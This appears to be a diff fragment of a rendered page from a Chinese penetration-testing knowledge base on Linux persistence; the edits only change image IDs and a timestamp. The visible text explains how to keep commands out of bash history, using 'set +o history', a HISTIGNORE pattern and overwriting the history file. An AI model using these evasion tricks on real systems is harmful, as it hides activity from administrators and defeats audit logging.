 <p>&#x9690;&#x85CF;&#x547D;&#x4EE4;&#x7684;&#x65B9;&#x5F0F;&#x6709;&#x5F88;&#x591A;&#xFF0C;history &#x53EA;&#x4F1A;&#x5728;&#x4F1A;&#x8BDD;&#x7ED3;&#x675F;&#x65F6;&#x5199;&#x5165;&#xFF0C;&#x6240;&#x4EE5;&#x53EA;&#x8981;&#x4F1A;&#x8BDD;&#x8FD8;&#x6CA1;&#x6709;&#x7ED3;&#x675F;&#x5C31;&#x53EF;&#x4EE5;&#x60F3;&#x529E;&#x6CD5;&#x9690;&#x85CF;&#x3002;&#x6BD4;&#x5982;&#x540C;&#x65F6;&#x5F00;&#x542F;&#x4E24;&#x4E2A;&#x7EC8;&#x7AEF;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x7EC8;&#x7AEF;&#x542F;&#x52A8;vim&#x7F16;&#x8F91;history&#x6587;&#x4EF6;&#xFF0C;&#x7B49;&#x7B2C;&#x4E8C;&#x4E2A;&#x6267;&#x884C;&#x7684;&#x90FD;&#x5DEE;&#x4E0D;&#x591A;&#x4E86;&#xFF0C;&#x7ED3;&#x675F;&#x4F1A;&#x8BDD;&#x540E;&#xFF0C;&#x5728;&#x4FDD;&#x5B58;&#x7B2C;&#x4E00;&#x4E2A;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x8986;&#x76D6;&#x4E86;&#x7B2C;&#x4E8C;&#x4E2A;&#x7EC8;&#x7AEF;&#x6240;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;&#x3002; &#x8FD9;&#x91CC;&#x6211;&#x5206;&#x4EAB;&#x51E0;&#x4E2A;&#x7ECF;&#x5E38;&#x4F7F;&#x7528;&#x7684;&#x9690;&#x85CF;&#x5386;&#x53F2;&#x547D;&#x4EE4;&#x7684;&#x65B9;&#x6CD5;&#x3002;</p>
 <pre class="language-"><code class="lang-bash"><span class="token builtin class-name">set</span> +o <span class="token function">history</span> <span class="token comment"># &#x4E0D;&#x4F1A;&#x5C06;&#x4EFB;&#x4F55;&#x5F53;&#x524D;&#x4F1A;&#x8BDD;&#x5199;&#x5165;&#x65E5;&#x5FD7;&#x3002;&#x53EF;&#x4EE5;&#x5728;&#x4F1A;&#x8BDD;&#x671F;&#x95F4;&#x4EFB;&#x4F55;&#x65F6;&#x95F4;&#x8FD0;&#x884C;&#xFF0C;&#x5E76;&#x9690;&#x85CF;&#x6240;&#x6709;&#x547D;&#x4EE4;&#x3002;</span>
 </code></pre>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182389395629022.jpg" data-lightbox="d4200018-f6cc-41dc-ba0b-f013a3e0e85a" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182389395629022.jpg" alt=""></a></p>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418240019782694.jpg" data-lightbox="9acc7037-255b-4b95-bb14-a327d0895445" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418240019782694.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182389395629022.jpg" data-lightbox="856f348e-9978-4f77-9bbb-246e61ab0c61" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182389395629022.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418240019782694.jpg" data-lightbox="e9b6897b-4d1e-40e0-97a5-4dccd19d84f5" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418240019782694.jpg" alt=""></a></p>
 <pre class="language-"><code class="lang-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">HISTIGNORE</span><span class="token operator">=</span><span class="token string">&quot;*|*&quot;</span> //&#x8FD9;&#x6761;&#x547D;&#x4EE4;&#x662F;&#x4E0D;&#x8BB0;&#x5F55;&#x5E26;&#x6709;&#x7BA1;&#x9053;&#x7B26;&#x7684;&#x547D;&#x4EE4;&#x3002;
 </code></pre>
 <p>&#x6267;&#x884C;&#x540E;&#x547D;&#x4EE4;&#x53EF;&#x4EE5;<code>echo 123123123 | whoami</code>&#x8FD9;&#x6837;&#x4E5F;&#x53EF;&#x4EE5;&#x505A;&#x5230;&#x9690;&#x85CF;&#x547D;&#x4EE4;&#x7684;&#x76EE;&#x7684;&#x3002;    </p>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418240928977330.jpg" data-lightbox="bf0f5d66-706e-4650-a39c-acba1cf6b0b8" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418240928977330.jpg" alt=""></a></p>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182417458496307.jpg" data-lightbox="efb388e5-7693-4163-87c4-2cf3c62b92ca" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182417458496307.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418240928977330.jpg" data-lightbox="218f5df2-8e81-4017-be33-44549df57797" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823418240928977330.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182417458496307.jpg" data-lightbox="9f2d3857-662f-4d4f-8f3e-63e2131b0c1e" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234182417458496307.jpg" alt=""></a></p>
 <p><strong>Info&#xFF1A;</strong></p>
 <blockquote>
 <p><a href="https://www.freebuf.com/vuls/205516.html" target="_blank">https://www.freebuf.com/vuls/205516.html</a></p>
@@ -4849,7 +4875,7 @@ gcc suid.c -o suidshell
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"02.Linux权限维持","level":"1.2.4.2","depth":3,"next":{"title":"03.扩展","level":"1.2.4.3","depth":3,"path":"个人知识库/01.渗透测试/04.权限维持/03.扩展.md","ref":"个人知识库/01.渗透测试/04.权限维持/03.扩展.md","articles":[]},"previous":{"title":"01.Windows权限维持","level":"1.2.4.1","depth":3,"path":"个人知识库/01.渗透测试/04.权限维持/01.Windows权限维持.md","ref":"个人知识库/01.渗透测试/04.权限维持/01.Windows权限维持.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","chapter-fold","expandable-chapters","splitter","page-treeview","lightbox","donate","hide-element","code","tbfed-pagefooter","pageview-count","ancre-navigation","anchor-navigation-ex","insert-logo","favicon","github","flexible-alerts","prism","auto-scroll-table","d4test","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright &copy d4m1ts 2023","modify_label":"该文章修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"page-treeview":{"collapsed":false,"copyright":"Copyright &#169; d4m1ts","minHeaderCount":"2","minHeaderDeep":"2"},"chapter-fold":{},"prism":{"css":["prismjs/themes/prism-tomorrow.css"],"lang":{"flow":"typescript"},"ignore":["mermaid","eval-js","ascii","result","manifest","payload","google","tree","java_out","log4j2","jsp","class","Exception","stack","c#","xml-dtd","C++","twig","jinja2","exception","tpl"]},"d4test":{},"github":{"url":"https://github.com/damit5"},"livereload":{},"splitter":{},"auto-scroll-table":{},"code":{"copyButtons":true},"donate":{"alipay":"/README.assets/gzh_1.png","alipayText":"WX","button":"关注","title":"","wechat":"/README.assets/gzh_0.png","wechatText":"公众号"},"hide-element":{"elements":[".gitbook-link",".treeview__copyright",".treeview__main-title"]},"fontsettings":{"theme":"white","family":"sans","size":2},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":true},"favicon":{"shortcut":"/README.assets/favicon.ico","bookmark":"/README.assets/favicon.ico","appleTouch":"/README.assets/favicon.ico","appleTouchMore":{"120x120":"/README.assets/favicon.ico","180x180":"/README.assets/favicon.ico"}},"lightbox":{"jquery":true,"sameUuid":false},"pageview-count":{},"ancre-navigation":{"associatedWithSummary":true,"float":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showLevel":true},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"},"comment":{"label":"Comment","icon":"fa fa-comments","className":"info"}},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"insert-logo":{"style":"background: none; max-height: 40px; min-height: 40px","url":"/README.assets/logo.png"},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"d4m1ts","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"d4m1ts 知识库","gitbook":"*","description":"个人的部分知识技能，倾向于使用知识库的方式进行总结回顾自己","theme-default":{"showLevel":true}},"file":{"path":"个人知识库/01.渗透测试/04.权限维持/02.Linux权限维持.md","mtime":"2022-01-08T10:29:59.141Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-05-16T05:28:51.949Z"},"basePath":"../../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"02.Linux权限维持","level":"1.2.4.2","depth":3,"next":{"title":"03.扩展","level":"1.2.4.3","depth":3,"path":"个人知识库/01.渗透测试/04.权限维持/03.扩展.md","ref":"个人知识库/01.渗透测试/04.权限维持/03.扩展.md","articles":[]},"previous":{"title":"01.Windows权限维持","level":"1.2.4.1","depth":3,"path":"个人知识库/01.渗透测试/04.权限维持/01.Windows权限维持.md","ref":"个人知识库/01.渗透测试/04.权限维持/01.Windows权限维持.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","chapter-fold","expandable-chapters","splitter","page-treeview","lightbox","donate","hide-element","code","tbfed-pagefooter","pageview-count","ancre-navigation","anchor-navigation-ex","insert-logo","favicon","github","flexible-alerts","prism","auto-scroll-table","d4test","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright &copy d4m1ts 2023","modify_label":"该文章修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"page-treeview":{"collapsed":false,"copyright":"Copyright &#169; d4m1ts","minHeaderCount":"2","minHeaderDeep":"2"},"chapter-fold":{},"prism":{"css":["prismjs/themes/prism-tomorrow.css"],"lang":{"flow":"typescript"},"ignore":["mermaid","eval-js","ascii","result","manifest","payload","google","tree","java_out","log4j2","jsp","class","Exception","stack","c#","xml-dtd","C++","twig","jinja2","exception","tpl"]},"d4test":{},"github":{"url":"https://github.com/damit5"},"livereload":{},"splitter":{},"auto-scroll-table":{},"code":{"copyButtons":true},"donate":{"alipay":"/README.assets/gzh_1.png","alipayText":"WX","button":"关注","title":"","wechat":"/README.assets/gzh_0.png","wechatText":"公众号"},"hide-element":{"elements":[".gitbook-link",".treeview__copyright",".treeview__main-title"]},"fontsettings":{"theme":"white","family":"sans","size":2},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":true},"favicon":{"shortcut":"/README.assets/favicon.ico","bookmark":"/README.assets/favicon.ico","appleTouch":"/README.assets/favicon.ico","appleTouchMore":{"120x120":"/README.assets/favicon.ico","180x180":"/README.assets/favicon.ico"}},"lightbox":{"jquery":true,"sameUuid":false},"pageview-count":{},"ancre-navigation":{"associatedWithSummary":true,"float":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showLevel":true},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"},"comment":{"label":"Comment","icon":"fa fa-comments","className":"info"}},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"insert-logo":{"style":"background: none; max-height: 40px; min-height: 40px","url":"/README.assets/logo.png"},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"d4m1ts","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"d4m1ts 知识库","gitbook":"*","description":"个人的部分知识技能，倾向于使用知识库的方式进行总结回顾自己","theme-default":{"showLevel":true}},"file":{"path":"个人知识库/01.渗透测试/04.权限维持/02.Linux权限维持.md","mtime":"2022-01-08T10:29:59.141Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-05-16T12:54:29.615Z"},"basePath":"../../..","book":{"language":""}});
         });
     </script>
 </div>
